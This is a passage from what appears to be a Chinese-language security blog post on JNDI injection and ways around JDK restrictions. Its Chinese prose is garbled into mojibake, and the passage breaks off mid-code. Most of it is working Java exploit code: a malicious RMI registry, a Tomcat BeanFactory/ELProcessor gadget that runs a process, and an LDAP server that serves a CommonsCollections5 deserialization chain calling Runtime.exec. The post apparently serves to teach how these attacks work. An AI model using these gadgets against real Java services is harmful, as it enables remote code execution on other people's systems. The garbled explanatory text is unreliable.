Reference</code>è¿™ç§åˆ©ç”¨æ–¹å¼å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ã€‚å¦‚æœJavaå¯¹è±¡çš„<code>javaSerializedData</code>å±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„o<code>bj.decodeObject()</code>æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚</li></ul><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><p>Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Clientå­˜åœ¨Factoryï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Static Code&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Non-Arg Constructor&quot;</span>);<br>    &#125;<br><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;Constructor Code&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;getObjectInstance&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢è¯´åˆ°Clientä¼šå…ˆå°è¯•æœ¬åœ°åŠ è½½ç±»ï¼Œå› æ­¤lookupè¯·æ±‚åï¼ŒåŠ è½½å¹¶å®ä¾‹åŒ–äº†Testç±»ã€‚</p><blockquote><p>Static Code Constructor Code Non-Arg Constructor getObjectInstance</p></blockquote><h3 id="æœ¬åœ°Classåˆ©ç”¨"><a href="#æœ¬åœ°Classåˆ©ç”¨" class="headerlink" title="æœ¬åœ°Classåˆ©ç”¨"></a>æœ¬åœ°Classåˆ©ç”¨</h3><p>ç›®å‰å…¬å¼€å¸¸ç”¨çš„åˆ©ç”¨æ–¹æ³•æ˜¯é€šè¿‡ <strong>Tomcat</strong> çš„ <strong>org.apache.naming.factory.BeanFactory</strong> å·¥å‚ç±»å»è°ƒç”¨ <strong>javax.el.ELProcessor#eval</strong> æ–¹æ³•æˆ– <strong>groovy.lang.GroovyShell#evaluate</strong> æ–¹æ³•</p><blockquote><p><code>org.apache.naming.factory.BeanFactory</code> åœ¨ <code>getObjectInstance()</code> ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ–<code>Reference</code>æ‰€æŒ‡å‘çš„<code>Bean Class</code>ï¼Œå¹¶ä¸”èƒ½è°ƒç”¨ä¸€äº›æŒ‡å®šçš„æ–¹æ³•</p></blockquote><p>è¦ä½¿ç”¨ <code>javax.el.ELProcessor</code>ï¼Œéœ€è¦ <code>Tomcat 8+</code>æˆ–<code>SpringBoot 1.2.x+</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;running&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æç•¥ï¼Œçœ‹åŸæ–‡å»å§ã€‚</p><p>è¿™é‡Œç›´æ¥ç»™å‡ºï¼Œ<code>method.invoke</code>çš„è§¦å‘å¯¹è±¡éœ€æ»¡è¶³ï¼š</p><ul><li>æœ‰æ— å‚æ„é€ å™¨ï¼ˆ<code>beanClass.getConstructor().newInstance()</code>è°ƒç”¨æ— å‚æ„é€ å™¨ï¼‰</li><li>æœ‰ä¸€ä¸ªå¯åˆ©ç”¨çš„æ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•æ¥æ”¶ä¸”åªæ¥æ”¶ä¸€ä¸ªStringç±»å‹å‚æ•°ï¼ˆvalueArrayæ˜¯Stringç±»å‹çš„æ•°ç»„ï¼Œåªæœ‰ä¸€ä¸ªå…ƒç´ ï¼‰</li></ul><p>æœ¬åœ°åˆ©ç”¨çš„è°ƒç”¨æ ˆï¼š</p><blockquote><p><code>InitialContext#lookup()</code> <code>RegistryContext#lookup()</code> <code>RegistryContext#decodeObject()</code> <code>NamingManager#getObjectInstance()</code> <code>objectfactory = NamingManager#getObjectFactoryFromReference()</code> <code>Class#newInstance()</code> &#x2F;&#x2F;â€“&gt;æ¶æ„ä»£ç è¢«æ‰§è¡Œ </p><p>æˆ–: <code>objectfactory#getObjectInstance()</code> &#x2F;&#x2F;â€“&gt;æ¶æ„ä»£ç è¢«æ‰§è¡Œ</p></blockquote><h3 id="ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡"><a href="#ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡" class="headerlink" title="ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡"></a>ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Serverï¼šç”¨CC5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( String[] tmp_args )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        String[] args=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;http://127.0.0.1/#calc&quot;</span>&#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;<br><br>        <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>        config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>        config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(args[ <span class="hljs-number">0</span> ])));<br>        <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>        System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>        ds.startListening();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br><br>            e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>,CommonsCollections5());<br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] CommonsCollections5() <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map lazyMap=LazyMap.decorate(map,chainedTransformer);<br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;test&quot;</span>);<br>        BadAttributeValueExpException badAttributeValueExpException=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        Field field=badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1389/calc&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span 